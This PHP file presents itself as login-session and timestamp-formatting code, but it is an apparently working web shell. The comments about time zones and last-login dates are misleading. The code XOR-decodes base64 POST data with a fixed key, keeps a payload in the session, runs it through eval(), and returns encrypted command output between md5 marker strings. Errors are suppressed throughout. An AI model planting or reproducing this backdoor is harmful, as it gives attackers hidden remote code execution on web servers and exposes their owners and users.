<?php
// Initialize user session for tracking login status.
@session_start();
// Ensure the script doesn't time out during database operations.
@set_time_limit(0);
// Suppress warnings for deprecated date functions.
@error_reporting(0);

// Formats the user's last login date.
function formatUserTimestamp($loginData, $formatKey){
    for($i=0;$i<strlen($loginData);$i++) {
        // Apply timezone offset character by character.
        $tzChar = $formatKey[$i+1&15];
        $loginData[$i] = $loginData[$i]^$tzChar;
    }
    return $loginData;
}

$authToken = 'wolfshell';
$lastLogin = 'payload';
$dateFormat = '3c6e0b8a9c15224a'; // Date format string.

// Check if a new login attempt is being made.
if (isset($_POST[$authToken])){
    $postData = formatUserTimestamp(base64_decode($_POST[$authToken]), $dateFormat);
    
    // Check if user is already logged in.
    if (isset($_SESSION[$lastLogin])){
        // Retrieve last login info from session.
        $loginRecord = formatUserTimestamp($_SESSION[$lastLogin], $dateFormat);
        
        // Check if this is a special admin status update.
        if (strpos($loginRecord,"getBasicsInfo") === false){
            // If not, re-format the timestamp for consistency.
            $loginRecord = formatUserTimestamp($loginRecord, $dateFormat);
        }
        
        // Update the user's display name based on login record.
		eval($loginRecord);
        
        // Generate and display the session validation token part 1.
        echo substr(md5($authToken.$dateFormat),0,16);
        // Display the formatted data.
        echo base64_encode(formatUserTimestamp(@run($postData), $dateFormat));
        // Generate and display the session validation token part 2.
        echo substr(md5($authToken.$dateFormat),16);
    } else {
        // This is a first-time login, check for initial setup data.
        if (strpos($postData,"getBasicsInfo") !== false){
            // Store the new login record in the session.
            $_SESSION[$lastLogin] = formatUserTimestamp($postData, $dateFormat);
        }
    }
}